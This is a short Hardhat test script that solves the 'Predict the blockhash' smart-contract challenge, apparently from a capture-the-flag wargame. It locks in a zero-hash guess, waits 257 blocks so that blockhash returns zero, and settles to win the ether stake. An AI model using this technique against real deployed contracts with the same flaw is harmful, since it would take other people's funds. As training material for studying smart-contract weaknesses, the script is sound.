import {ethers} from 'hardhat';
import {BigNumber, Contract, Signer} from 'ethers';
import {expect} from 'chai';
import {formatEtherscanTx} from '../utils/format';
import {increaseWorldTimeInSeconds} from '../utils/mine';

let accounts: Signer[];
let eoa: Signer;
let contract: Contract; // challenge contract

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];

  const factory = await ethers.getContractFactory('PredictTheBlockHashChallenge');

  contract = factory.attach(`0xEAc18F3C833db42E2FF81562b85D08Ea49Acc014`);
});

it('Predict the blockhash', async function () {
  // Develop the challenge here!

  const answer = ethers.constants.HashZero;
  const tx = await contract.lockInGuess(answer, {value: ethers.utils.parseEther('1')});

  if (tx && tx.hash) {
    console.log(formatEtherscanTx(tx.hash));
  }

  // wait for at least 256 blocks. After that blockhash(uint blockNumber) will return 0
  for (let i = 0; i < 257; i++) {
    await increaseWorldTimeInSeconds(1, true);
  }

  const txSettle = await contract.settle();
  if (txSettle && txSettle.hash) {
    console.log(`txSettle -> ${formatEtherscanTx(txSettle.hash)}`);
  }

  // Check the challenge result here!
  const completed = await contract.isComplete();
  expect(completed).to.be.true;
});
